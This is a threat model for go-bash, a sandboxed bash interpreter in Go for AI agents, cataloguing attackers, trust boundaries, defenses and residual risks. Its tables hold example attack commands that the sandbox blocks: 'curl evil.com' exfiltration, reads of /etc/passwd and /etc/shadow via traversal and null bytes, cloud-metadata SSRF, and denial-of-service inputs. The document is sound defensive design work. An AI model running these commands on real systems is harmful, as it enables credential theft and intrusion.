# go-bash Threat Model

## Context

go-bash is a Go implementation of a bash interpreter with an in-memory
virtual filesystem, designed for AI agents needing a secure, sandboxed
bash environment. It is a feature-for-feature port of
[just-bash](https://github.com/vercel-labs/just-bash) (TypeScript). This
document defines the full threat model: who the adversaries are, what
they can target, what defenses exist, what gaps remain, and residual
risks.

The model is **largely identical** to just-bash's because the runtime
shape, the VFS, and the network allow-list are direct ports. The
material differences come from the host language: **Go does not have
`eval`, `Function`, dynamic `import()`, prototype pollution, or a
shared global object that can be patched**. The "Code Execution
Escape", "Prototype Pollution", and "Dynamic import()" sections from
just-bash's threat model are deleted here — those vectors do not
exist in Go. See §8 "What Go gives us for free" at the end of this
document for the full structural-advantage list.

---

## 1. Threat Actors

### 1A. Untrusted Script Author (PRIMARY)
- **Who**: An AI agent or user submitting arbitrary bash scripts for
  execution.
- **Capability**: Full control over the bash script input. Can craft
  any valid (or invalid) bash syntax.
- **Goal**: Escape the sandbox, access the host filesystem, exfiltrate
  secrets, execute arbitrary code, cause denial of service, or escalate
  privileges.
- **Trust level**: ZERO — the script is completely untrusted.

### 1B. Malicious Data Source
- **Who**: External data consumed by scripts (HTTP responses, file
  content, stdin).
- **Capability**: Control over data that flows through expansion,
  variable assignment, command arguments.
- **Goal**: Exploit the interpreter via crafted data (injection via
  IFS, path traversal via filenames, oversized inputs).
- **Trust level**: ZERO — data is untrusted.

### 1C. Compromised Dependency
- **Who**: A supply-chain attacker modifying a Go module.
- **Capability**: Arbitrary code execution at import time or via
  patched APIs.
- **Goal**: Bypass sandbox from within the Go process.
- **Trust level**: N/A — out of scope for runtime defenses but
  relevant for supply-chain hardening (Go's checksum database +
  `go.sum` cover this layer).

---

## 1.1 Trust Assumptions

The following components are **trusted** and outside the scope of
go-bash's runtime defenses:

- **Host-provided `FS`, `Fetch`, `CustomCommands`, transform plugins,
  and `InvokeTool`**: These are supplied by the embedding application.
  A compromised or malicious host hook can bypass all sandboxing by
  design — go-bash protects untrusted *scripts*, not untrusted
  *hosts*.
- **The Go runtime and underlying OS**: go-bash assumes the Go
  toolchain, runtime, and OS kernel are not compromised. Exploits
  targeting `runtime/cgo`, the goroutine scheduler, or kernel
  vulnerabilities are out of scope.
- **Dependencies**: Supply-chain attacks via Go modules are a
  deployment-level concern (addressed by `go.sum`, `GOPROXY` policies,
  and `govulncheck`), not a runtime defense. The pinned dependency set
  is documented in `go.mod`; the only transitive runtime dependencies
  are `mvdan.cc/sh/v3` (the parser/interpreter substrate),
  `modernc.org/sqlite` (pure-Go SQLite, opt-in), and small text/glob
  utilities. No cgo is used; all builds verify with `CGO_ENABLED=0`.

---

## 2. Trust Boundaries

```
┌────────────────────────────────────────────────────────────────────┐
│ HOST PROCESS (Go)                                                  │
│                                                                    │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │ GO-BASH SANDBOX                                              │  │
│  │                                                              │  │
│  │  ┌───────────┐   ┌──────────────┐   ┌──────────────────┐    │  │
│  │  │ Parser    │──▶│ AST          │──▶│ Interpreter      │    │  │
│  │  │ (mvdan/sh)│   │ (transforms) │   │ (mvdan/sh runner)│    │  │
│  │  │ Limits:   │   │              │   │ Limits:          │    │  │
│  │  │ MaxInput  │   │              │   │ MaxCommandCount  │    │  │
│  │  │ MaxTokens │   │              │   │ MaxLoopIter      │    │  │
│  │  │ MaxDepth  │   │              │   │ MaxCallDepth     │    │  │
│  │  │ MaxHeredoc│   │              │   │ MaxStringLength  │    │  │
│  │  └───────────┘   └──────────────┘   └────────┬─────────┘    │  │
│  │                                              │              │  │
│  │  ┌─────────────────────────────────┐  ┌──────▼──────────┐   │  │
│  │  │ Builtin Registry                │  │ VFS             │   │  │
│  │  │ (~140 commands, dispatch ONLY)  │  │ (memfs/overlay/ │   │  │
│  │  │ NO os/exec fall-through         │  │  rwfs/mountfs)  │   │  │
│  │  └─────────────────────────────────┘  └─────────────────┘   │  │
│  │            │                                                │  │
│  │            ▼                                                │  │
│  │  ┌────────────────────────────────┐                         │  │
│  │  │ Network (opt-in, allow-listed) │                         │  │
│  │  │ - origin match                 │                         │  │
│  │  │ - path prefix                  │                         │  │
│  │  │ - method allow-list            │                         │  │
│  │  │ - redirect re-validation       │                         │  │
│  │  └────────────────────────────────┘                         │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                                                                    │
│  Host code (CustomCommands, Fetch override, InvokeTool, Logger)    │
│  is OUTSIDE the sandbox boundary and runs with full Go privileges. │
└────────────────────────────────────────────────────────────────────┘
```

**TB1 — Script Input → Parser**: User script is completely untrusted.
Parser must handle any input without crashing, hanging, or leaking
information. Backed by `mvdan.cc/sh/v3/syntax` plus the go-bash parser
wrapper that enforces input-size, token-count, and depth limits before
the AST is constructed.

**TB2 — Interpreter → Filesystem**: The interpreter issues filesystem
operations. The VFS layer must confine all access to the sandbox root,
block symlink traversal (default-deny), and prevent writes to the real
filesystem unless `rwfs` is explicitly chosen.

**TB3 — Interpreter → Network**: Network access disabled by default.
When enabled, URLs must pass the allow-list at the `network.Doer`
boundary. Per-redirect re-validation is mandatory; redirect targets
that fall outside the allow-list abort the request.

**TB4 — Interpreter → Host Process**: The interpreter must never spawn
child processes, access host environment variables, or reach Go
runtime internals (`os/exec`, `syscall.Exec`, `os.Environ`).
Architecturally enforced — no `os/exec` import exists in the runtime
package, and unknown commands return exit 127 instead of falling
through to a host lookup.

**TB5 — Data → Variable/Key Space**: User-controlled data becomes Go
map keys (env vars, AWK variables, associative array keys). Unlike
JavaScript, Go maps are not prototype-poisonable — keys are values,
not property lookups, and there is no shared `Object.prototype`.
This entire boundary is structurally safe (see §8).

---

## 3. Attack Surface Inventory

### 3.1 Script Input (Parser)

| Vector | Description | Defense | Files |
|---|---|---|---|
| Token bomb | Script with pathological tokenization | mvdan/sh parser is bounded; `MaxTokens` cap in go-bash wrapper | `parser/limits.go` |
| Parser stack overflow | Deeply nested constructs | `MaxParserDepth` (200) | `parser/limits.go` |
| Oversized input | Very large scripts | `MaxInputSize` (1 MiB) | `parser/limits.go` |
| Heredoc bomb | Huge heredoc content | `MaxHeredocSize` (10 MiB) | `limits.go` |
| Malformed input | Invalid bash syntax | Parser returns `*ParseError`, doesn't crash | `parser/parser.go` |

### 3.2 Expansion & Substitution

| Vector | Description | Defense | Files |
|---|---|---|---|
| Brace expansion bomb | `{1..999999}` | `MaxBraceExpansionResults` (10000) | `expansion_test.go` |
| Cmd substitution depth | `$($($($(…))))` | `MaxSubstitutionDepth` (50) | `limits.go` |
| String growth | `${x//a/aaaa}` in loop | `MaxStringLength` (10 MiB) | `limits.go` |
| Glob bomb | `**/*` across large FS | `MaxGlobOperations` (100000) | `limits.go` |
| IFS injection | Custom IFS to split commands | IFS only affects word splitting, not parsing | mvdan/sh |
| Arithmetic overflow | `$((2**63))` | Go's `int` is 64-bit; mvdan/sh follows POSIX semantics (wraps) | mvdan/sh |
| Division by zero | `$((1/0))` | mvdan/sh returns runtime error, exit non-zero | mvdan/sh |

### 3.3 Filesystem

| Vector | Description | Defense | Files |
|---|---|---|---|
| Path traversal | `../../etc/passwd` | Path normalization + `fs.Validate` reject null bytes; VFS root containment via `realfs.ResolveAndValidate` | `fs/path.go`, `fs/realfs/realfs.go` |
| Symlink escape | Symlink pointing outside root | Default-deny (`AllowSymlinks: false`) | `fs/overlayfs/overlayfs.go` |
| Null byte injection | `file\x00.txt` | `fs.Validate` rejects null bytes and empty paths | `fs/path.go` |
| TOCTOU race | Check-then-use timing gap | `ResolveAndValidate` returns the canonical path the call site must use; no re-resolution between check and open | `fs/realfs/realfs.go` |
| Write to host FS | Persisting malicious files | `memfs` is in-memory; `overlayfs` captures writes in an in-memory overlay; only `rwfs` writes to disk (opt-in by construction) | `fs/memfs/`, `fs/overlayfs/`, `fs/rwfs/` |
| /proc /sys access | Reading host process info | VFS exposes a synthesized `/proc/self/status` with virtualized PID/UID; the host `/proc` is unreachable | `fs_init.go` |
| Broken symlink write | Write through broken symlink | `OpenFileNoFollow` rejects when symlinks are off; with symlinks on, lstat the leaf before write | `fs/realfs/syscall_unix.go` |
| Real path disclosure | Error messages reveal host paths | `realfs.SanitizeError` strips real path prefixes from errors that bubble out of the runtime | `fs/realfs/realfs.go` |
| `$PID` / `$PPID` leak | Script reads host PID via `$$` | `procinfo.go` rewrites `$$`, `$PPID`, `$BASHPID` at parse time to the configured `ProcessInfo` (default PID=1, PPID=0) | `procinfo.go` |

### 3.4 Network

| Vector | Description | Defense | Files |
|---|---|---|---|
| Arbitrary access | `curl evil.com` | Network disabled by default; `curl` runtime nil-checks `c.Fetch` and prints "network disabled" when nil | `builtins/curl/curl.go` |
| SSRF via redirects | Redirect to internal service | Each redirect re-validated against allow-list; redirect handling is manual (not delegated to `http.Client`'s default redirect chain) | `network/securefetch.go` |
| Response bomb | Huge response body | `MaxResponseSize` (10 MiB) enforced via `Content-Length` check + streaming size cap | `network/securefetch.go` |
| Protocol restriction | Only http/https allowed | Allow-list rejects all other schemes at config-load time | `network/allowlist.go` |
| URL manipulation | `https://evil.com@good.com` | Full URL parsing via `net/url.Parse`; userinfo is ignored when comparing origins | `network/allowlist.go` |
| Header pollution | Malicious response headers | Response headers stored in a `map[string]string`; Go maps are not prototype-poisonable (see §8) | `network/securefetch.go` |
| Private-range SSRF | `curl http://169.254.169.254` (AWS metadata) | `DenyPrivateRanges` resolves the host and rejects RFC-1918 / link-local / loopback before dial | `network/securefetch.go` |
| Credential injection from script | Script sets `Authorization: ...` to leak data | Allow-list `Transform.Headers` are applied AFTER script headers and override; the script cannot impersonate the host's credentials | `network/securefetch.go` |

### 3.5 Code Execution Escape

**This section is intentionally short.** In Go, the language-level
escape vectors that dominate just-bash's threat model do not exist:

| Vector | Status |
|---|---|
| `Function` constructor | **N/A** — Go has no eval. |
| `eval()` | **N/A** — Go has no eval. The bash `eval` builtin parses and re-runs script text inside the same sandboxed interpreter; it does NOT reach Go code. |
| `.constructor.constructor` chain | **N/A** — Go has no prototype chain. |
| Dynamic `import()` | **N/A** — Go has no runtime import. |
| `setTimeout(string)` | **N/A** — Go has no equivalent. |
| `process.binding()` / `process.dlopen()` | **N/A** — Go has no `process` global. |
| `Module._load()` / `Module._resolveFilename()` | **N/A** — Go has no module loader at runtime. |
| `Error.prepareStackTrace` | **N/A** — Go stack traces are values, not callbacks. |
| WebAssembly compilation | **N/A** — Go doesn't expose runtime WASM compilation in the script context. |
| `Proxy` constructor | **N/A** — Go has no `Proxy`. |
| `child_process` spawn | **BLOCKED architecturally** — `os/exec` is not imported anywhere in the runtime package; no code path exists from the interpreter to host-process spawn. (The `cmd/record-fixtures` tooling can use `os/exec`, but it is build-time, not runtime.) |

**The remaining defense-in-depth vectors from just-bash's §3.5 are
not ported because the host language does not require them.** See §8.

### 3.6 Information Disclosure

| Vector | Description | Defense | Files |
|---|---|---|---|
| `os.Environ()` leak | Script reads `$PATH`, secrets from host env | `Bash.Env` is a private map seeded from `BashOptions.Env`; `os.Environ()` is NOT inherited. The runtime sets `$PATH` to `/usr/bin:/bin` by default | `bash.go` |
| `os.Args` leak | Script reads CLI args of host process | Bash env doesn't expose `os.Args`; the CLI's argv only seeds the script context, not the script's `$0`/`$@` | `cmd/gobash/main.go` |
| `os.Executable()` leak | Reveal Go binary path | Not exposed to scripts | Architecture |
| Real path disclosure via errors | FS error with real path | `realfs.SanitizeError` strips the root prefix before the error bubbles out | `fs/realfs/realfs.go` |
| Real PID disclosure via `$$` | mvdan/sh hardcodes `$$` to `os.Getpid()` | `procinfo.go` rewrites `$$`, `$PPID`, `$BASHPID` at AST level to the virtual `ProcessInfo` values | `procinfo.go` |
| Host TZ disclosure via `date` | `date %Z` reveals the host's TZ | `date` builtin defaults to UTC regardless of host clock; the host's `$TZ` is NOT inherited. To opt into a zone, the host must pass `Env: {TZ: ...}` explicitly | `builtins/date/` |
| `chmod`/`chown` host effect | Change host file permissions | All file-mode ops route through the VFS; only `rwfs` reaches the host disk, and even then `chmod`/`chown` only set the VFS-tracked mode | `builtins/chmod/`, `fs/rwfs/` |

---

## 4. Known Gaps & Residual Risks

### 4.1 Signal / Job Control Not Fully Modeled

**Risk**: LOW

Bash `trap` has limited security testing. Background job control (`&`,
`fg`, `bg`) operates on virtual PIDs only — go-bash doesn't spawn real
OS processes, so signals/jobs operate within the virtual model only.

### 4.2 Unicode / Encoding Edge Cases

**Risk**: LOW

No systematic testing for invalid UTF-8, homograph attacks, or RTL
override characters. These are display/confusion attacks, not execution
escape vectors. Go strings are byte sequences and the parser handles
arbitrary bytes (mvdan/sh's lexer is byte-oriented), so the parser
itself is robust; downstream display rendering is the host's
responsibility.

### 4.3 File Descriptor Manipulation

**Risk**: LOW

`MaxFileDescriptors` (default 1024) caps the per-Exec FD count. The
limit is enforced at the redirection plumbing layer. No tests for
`/dev/fd/` access — the virtual filesystem doesn't synthesize
`/dev/fd/` entries; calls to it return ENOENT.

### 4.4 Optional Runtime Surface (When Enabled)

#### 4.4.1 SQLite (`sqlite/` subpackage, opt-in)

**Risk**: LOW

`modernc.org/sqlite` is pure Go (a transpilation of upstream SQLite —
no cgo, no native code). The runtime:
- Disabled by default; the host must call `sqlite.Register(b, opts)`.
- File DBs shuttle through `os.MkdirTemp` + `os.WriteFile` and write
  back via `c.FS.WriteFile` on cleanup. The shuttle path uses a
  host-owned tmp dir, NOT user-controlled paths.
- 5-second timeout default (`MaxSqliteTimeout`); enforced via a
  goroutine that closes the DB connection on `ctx.Done()`.
- `:memory:` DBs have no real-FS footprint.

Residual risk: a malicious SQL query can consume CPU until the timeout
fires. The timeout is the only DoS defense — there is no row-limit
cap. Hosts that need defense against large result sets must add
`LIMIT` clauses themselves.

#### 4.4.2 JavaScript (`jsexec/` subpackage)

**Status**: NOT IMPLEMENTED in this build. The spec plans a
`goja`-backed runtime with `MaxJsTimeout` enforced via
`goja.Runtime.Interrupt`. Since goja is pure Go, no cgo, the JS
runtime would be isolated from the host by Go's normal type safety
(no shared mutable state, no `Function` from the host, no
`process` global unless explicitly injected). When this lands, the
threat model picks up an opt-in surface but no new host-escape
vectors — goja runs in-goroutine and cannot reach `os/exec` from
script context.

#### 4.4.3 Python (`pythonexec/` subpackage)

**Status**: NOT IMPLEMENTED. The spec plans a host-supplied
`Runtime` interface — the host wires up CPython externally (e.g.
via `docker run python:3.13` or a real `python3` binary). go-bash
does NOT embed CPython. When the host opts in to a real-process
runtime, that runtime escapes the sandbox by construction — the
host is responsible for isolating it (separate container, etc.).
Documented as an intentional divergence from just-bash, which
embeds WASM CPython.

### 4.5 Error Message Information Leakage

**Risk**: LOW (mitigated for known paths)

`realfs.SanitizeError` strips real-path prefixes from errors that
originate in the host FS layer. The Go error chain elsewhere
(parse errors, limit errors) carries no host-side paths.

### 4.6 mvdan/sh Divergences

**Risk**: VARIABLE (documented per case)

mvdan/sh — the parser/interpreter substrate — has five known
divergences from real bash, documented in `DECISIONS.md` sections
A–E. None of them have been observed to enable a sandbox escape,
but they are byte-level behavior differences that may surprise
host code comparing output against real bash. The divergences are
in: brace expansion, IFS handling under `read`, `printf` width
specifiers for non-ASCII, `[[ regex ]]` engine choice, and
`$RANDOM` seeding. See `DECISIONS.md` for details.

### 4.7 Heredoc Expansion Interaction

**Risk**: LOW

Heredocs with variable expansion are size-limited
(`MaxHeredocSize`, 10 MiB) but nested heredocs with complex
expansion haven't been exhaustively fuzzed.

### 4.8 `$BASHPID` Counter Scope

**Risk**: LOW (documented quirk)

`$BASHPID` is bumped only by lexical `(...)` subshells, NOT by
background `&`, process substitution, or pipeline stages. This is
documented in `DECISIONS.md` as a deliberate decision to match
mvdan/sh's call-frame structure rather than real bash's per-fork
PID semantics (Go has no fork). Scripts relying on `$BASHPID` as
a unique-per-stage ID will see collisions in those cases.

---

## 5. Defense Layer Summary

| Layer | Type | Scope | Bypass Difficulty |
|---|---|---|---|
| **Architecture** (no `os/exec` import) | Primary | Code execution | Very High — no code path exists |
| **Filesystem** (memfs/overlayfs/rwfs/mountfs) | Primary | File access | High — central gate functions (`resolveCanonicalPath`, `fs.Validate`) |
| **Symlink blocking** (default-deny in overlayfs) | Primary | Path traversal | High — zero-extra-I/O validation via path comparison |
| **Network allow-list** | Primary | Network access | High — default-off, per-redirect validation |
| **Command registry** | Primary | Command execution | High — only registered Go implementations run; unknown commands return exit 127 |
| **Execution limits** | Primary | DoS | High — enforced at every loop/call/expansion |
| **Go type safety** | Primary | Memory corruption / eval escape | Structural — see §8 |
| **Parser limits** | Primary | Parser DoS | High — token/depth/size/iteration limits |
| **mvdan/sh** | Primary | Bash semantics | High — mature library, fuzz-tested upstream |
| **Virtual process info** | Secondary | Info disclosure | High — `$$` / `$PPID` rewritten at AST level |
| **Error sanitization** | Secondary | Info disclosure | Medium — applied at FS error boundaries; custom commands must opt in |
| **UTC default for `date`** | Secondary | Host TZ disclosure | High — `date` builtin ignores host clock TZ |

---

## 6. Threat Scenarios & Verdicts

| # | Scenario | Path | Verdict |
|---|---|---|---|
| 1 | Read /etc/passwd | `cat /etc/passwd` → VFS → not seeded → ENOENT | **BLOCKED** (primary FS) |
| 2 | Symlink escape | `ln -s /etc/passwd x` → overlayfs `AllowSymlinks=false` → EPERM | **BLOCKED** (symlink policy) |
| 3 | Spawn host process | `os/exec`-like call from script | **N/A** — no `os/exec` import in runtime; no bash→Go path |
| 4 | Infinite loop | `while true; do :; done` → `MaxLoopIterations` → `ExecutionLimitError` | **BLOCKED** (limits) |
| 5 | Prototype pollution | `arr[__proto__]=evil` | **N/A** — Go map keys are values, not property lookups (§8) |
| 6 | Dynamic import escape | `import('/tmp/evil')` | **N/A** — Go has no runtime import |
| 7 | Network exfiltration | `curl evil.com` → network off → `curl` reports "network disabled" | **BLOCKED** (network isolation) |
| 8 | `process.exit()` from script | Reach Go's `os.Exit` | **N/A** — no bash→Go path; the bash `exit` builtin returns exit code via the runner, not `os.Exit` |
| 9 | Brace expansion OOM | `{1..999999999}` → `MaxBraceExpansionResults` → truncated/error | **BLOCKED** (limits) |
| 10 | Python escape | Python off by default; opt-in runtime is host-supplied | **HOST-DEFINED RISK** (opt-in, see §4.4.3) |
| 11 | ReDoS via user regex | `[[ str =~ pattern ]]` | **RESIDUAL** — Go `regexp` is RE2 (linear-time), but `[[ =~ ]]` routes through mvdan/sh's regex layer; verify against mvdan/sh upstream |
| 12 | Path traversal | `cat ../../etc/shadow` → normalize → root containment → ENOENT | **BLOCKED** (primary FS) |
| 13 | Null byte injection | `cat "file\x00../../etc/passwd"` → `fs.Validate` → rejected | **BLOCKED** (path validation) |
| 14 | Error path leak | FS error with real path → `realfs.SanitizeError` → stripped | **BLOCKED** (error sanitization) |
| 15 | `eval` escape from script | bash `eval` runs script text → stays in interpreter → no Go escape | **BLOCKED** (architecture — `eval` cannot reach Go) |
| 16 | Source depth bomb | Self-sourcing `source /s.sh` → `MaxSourceDepth` (100) → error | **BLOCKED** (limits) |
| 17 | FD exhaustion | `exec N>/dev/null` loop → `MaxFileDescriptors` (1024) → error | **BLOCKED** (limits) |
| 18 | Host TZ disclosure via `date` | `date %Z` → builtin defaults to UTC | **BLOCKED** (UTC default) |
| 19 | Host PID disclosure via `$$` | `echo $$` → procinfo rewrite → virtual PID (default 1) | **BLOCKED** (procinfo) |
| 20 | Host env disclosure via `printenv` | `printenv PATH` → only the BashOptions.Env-seeded vars are visible | **BLOCKED** (env isolation) |
| 21 | `$BASHPID` host PID leak | mvdan/sh hardcodes to `os.Getpid()` | **BLOCKED** — procinfo rewrites at AST level (caveat: §4.8) |
| 22 | SSRF via redirect | 302 to internal service → per-redirect allow-list check → blocked | **BLOCKED** (network) |
| 23 | Credential leak via script header | Script sets `Authorization` to leak data → transform headers override at fetch boundary | **BLOCKED** (network transforms) |
| 24 | Private-range SSRF | `curl http://169.254.169.254` → `DenyPrivateRanges` resolves and rejects | **BLOCKED** when configured (off by default — host must opt in) |

---

## 7. Recommendations for Future Hardening

1. **`internal/lint/no-os-exec` analyzer** — A go-vet-style analyzer
   to bans `os/exec` imports outside `cmd/record-fixtures` and
   `pythonexec/exec`. Currently enforced by code review and convention;
   mechanizing it would close the small remaining gap. **Planned for
   Phase 21.**
2. **`internal/lint/no-net-default`** — Ban `net/http.DefaultClient`,
   `net.Dial`, etc. outside `network/`. Same rationale as above.
   **Planned for Phase 21.**
3. **Fuzzing corpora** — `go test -fuzz` for `parser.Parse`,
   `internal/glob.Match`, and parameter expansion. **Planned for
   Phase 21.**
4. **Total memory ceiling** — Track total memory allocated per `Exec`
   call to provide a hard memory ceiling (not just per-object limits).
5. **Expanded fuzzing** — Add grammar rules for `trap`, job control
   (`&`, `fg`, `bg`), and deeply nested heredocs with expansion.
6. **mvdan/sh divergence reconciliation** — Either close the five
   divergences in `DECISIONS.md` A–E or formally document them as
   permanent Go-side semantics.
7. **`date` per-call TZ enforcement** — Currently the default is UTC
   when `$TZ` is unset; document the recommendation that hosts forward
   their own `$TZ` to scripts ONLY when intentional.

---

## 8. What Go Gives Us For Free

go-bash inherits a large set of structural advantages from its host
language that just-bash had to engineer defenses for. Cataloguing
them is useful both as a reassurance and as a guide to where the Go
port is structurally simpler than the TS original:

### 8.1 No `eval` / `Function` / dynamic `import()` in Go

The single biggest deletion from just-bash's threat model is the
entire "Code Execution Escape" attack surface. just-bash needs
proxies, getter blocks, ESM loader hooks, and a 200-line
"defense-in-depth box" to prevent script-driven JS escape. **None of
that exists in Go.** A script cannot reach `eval`, cannot construct
a `Function`, cannot trigger a dynamic import, cannot call
`setTimeout(string)`, cannot get a reference to `WebAssembly.compile`,
cannot patch a global. There is no JavaScript engine in the sandbox.
The bash `eval` builtin reads script text and re-runs it inside the
same interpreter; it has no path to Go.

### 8.2 No prototype pollution

just-bash's `AGENTS.md` devotes a full section to prototype-pollution
defense: `Object.create(null)`, `safeSet`, `nullPrototypeCopy`,
`DANGEROUS_KEYS`. **Go maps are not prototype-poisonable.** A Go
map is a hash table; keys are values, not property lookups against a
chain. `m["__proto__"] = "evil"` stores the literal string
`"__proto__"` and has zero effect on any other map. The entire §3.9
table from just-bash's threat model and the entire "Prototype
Pollution Defense" section from just-bash's AGENTS.md are
**structurally N/A** in Go.

### 8.3 No `process` global

just-bash spends ~30 lines of threat model defending against
`process.env`, `process.argv`, `process.execPath`,
`process.stdout/stderr`, `process.connected`, `process.send`,
`process.setuid`, `process.setgid`, `process.umask`, `process.chdir`,
`process.mainModule`. **In Go, there is no `process` global
reachable from scripts.** The interpreter doesn't synthesize one;
the bash `$$` / `$PPID` / `$BASHPID` reads are intercepted at the
AST level (`procinfo.go`) and routed to the virtual `ProcessInfo`
struct. `os.Environ()` is not inherited into the bash env.

### 8.4 Static typing

Go's static type system rules out entire classes of confusion. The
`FS` parameter is typed as `fs.FileSystem`; a script cannot mutate it
into a different type. The `Network` config is a struct; a script
cannot patch its fields. Type-confusion attacks that target
JavaScript's `instanceof`, prototype chain, or duck-typing don't apply.

### 8.5 No shared mutable globals

Go has no `globalThis`. There is no `Object`, `Array`, `JSON`, `Math`
to freeze or patch. The runtime's `*Bash` is a per-instance value
that the script never gets a Go-level handle to — its mutations are
ephemeral to the script context.

### 8.6 Memory safety + bounded compilation

Go is memory-safe and has no `Function` constructor. There is no
runtime JIT or code-loading from script. Buffer overflows, use-after-
free, type-confusion via union types — all structurally impossible.
The race detector (`go test -race`) catches the remaining concurrency
class of bug during development.

### 8.7 Pure-Go SQLite

just-bash uses `sql.js` (WebAssembly). go-bash uses
`modernc.org/sqlite`, a pure-Go transpilation. No WASM sandbox to
escape, no JIT to attack, no shared memory between SQLite and the
host. `CGO_ENABLED=0` builds verify this in CI.

### 8.8 No `child_process` reachable

just-bash relies on "child_process is not imported anywhere" as an
architectural guarantee. go-bash has the same property: `os/exec` is
not imported in the runtime package. Unlike the JS case, **Go's
import system requires explicit imports at compile time** — there is
no `require`, no `import()`, no dynamic module loading. The lint
analyzer planned in §7 will mechanize the check, but even today the
guarantee is structurally enforced by the toolchain: you cannot
"sneak in" `os/exec` from a script.

### 8.9 Goroutine cancellation is first-class

`context.Context` propagates cancellation through every public
function. Scripts are cancelled cooperatively at statement boundaries
and at every `c.Stdin.Read` / `c.Stdout.Write` call. just-bash's
`AbortSignal` is the equivalent; go-bash's wiring is simpler because
`ctx` is part of every Go function signature by convention.

### 8.10 No event loop to starve

Goroutine scheduling is preemptive (Go 1.14+). A CPU-bound script
inside an in-flight `Exec` does not block other goroutines on the
same scheduler; the host's HTTP server, telemetry, and ctx-timeout
goroutines continue to run. just-bash's QuickJS- and Worker-based
isolation primarily exists to keep the V8 event loop responsive;
that concern doesn't exist in Go.

---

## Summary

go-bash's threat model is **smaller** than just-bash's because Go is
a structurally narrower target than JavaScript. The remaining attack
surface is concentrated in three places: **the parser**, **the VFS
boundary**, and **the network allow-list**. Each is defended by
explicit limits and explicit policy, with the runtime architecture
(no `os/exec`, no `eval`, no prototype chain) closing the categories
that dominate the JS port's threat model.

**Use go-bash for**: AI-agent bash tools, untrusted-script harnesses,
test runners that need a sandboxed shell.

**Do not use go-bash for**: replacing a full container runtime,
hosting arbitrary native binaries, running scripts that need real
job control or real signals. For those cases use
[Vercel Sandbox](https://vercel.com/docs/vercel-sandbox), Firecracker,
or a real VM.
